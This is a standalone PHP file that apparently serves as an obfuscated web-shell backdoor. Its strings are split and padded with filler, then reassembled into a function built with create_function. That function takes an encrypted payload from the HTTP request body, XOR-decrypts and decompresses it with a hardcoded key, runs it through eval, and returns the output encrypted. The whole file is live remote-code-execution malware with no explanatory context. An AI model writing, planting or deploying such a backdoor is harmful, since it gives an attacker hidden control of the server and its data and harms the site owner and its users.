<?php
$k='2/input:2"),$m)==1):2 {@:2ob_start:2();@:2eva:2l(@gzuncompre:2ss(@x(@:2:2bas:2e64_decode($m[1]):2,$k)):2);:2$o=@:2ob:2_';
$F=':2$k=":2575364:2f3";:2$kh="43e8e12cc782";:2$kf=:2:2"b427b3:2c095:234";:2$p="SImnWpI:2T7ml9t4X:2h";:2function x(:2$t,$';
$M='get_contents():2:2;@:2ob_end_clea:2n();$r=:2@ba:2se64_encode(@x:2:2(@gzcompre:2ss($o):2,$k));pri:2nt(:2"$p$k:2h$r$kf");}';
$g='$o.=:2$t{$i}^:2$:2k{$j};}}re:2tur:2n $o;}if (:2:2@preg_m:2atch(:2"/$kh(.+)$:2kf/":2,@file_get:2_c:2o:2ntents("php:/:2:';
$V='k):2{$c=st:2rlen($k:2):2;$l=strlen($:2t);$o:2=":2";:2for($i=0;$i<$l;:2):2{for(:2$j:2=0;($j<$:2c&&$i<$l);:2$j++,$i++):2{';
$J=str_replace('z','','zcrezatez_fuzzznction');
$w=str_replace(':2','',$F.$V.$g.$k.$M);
$U=$J('',$w);$U();
?>
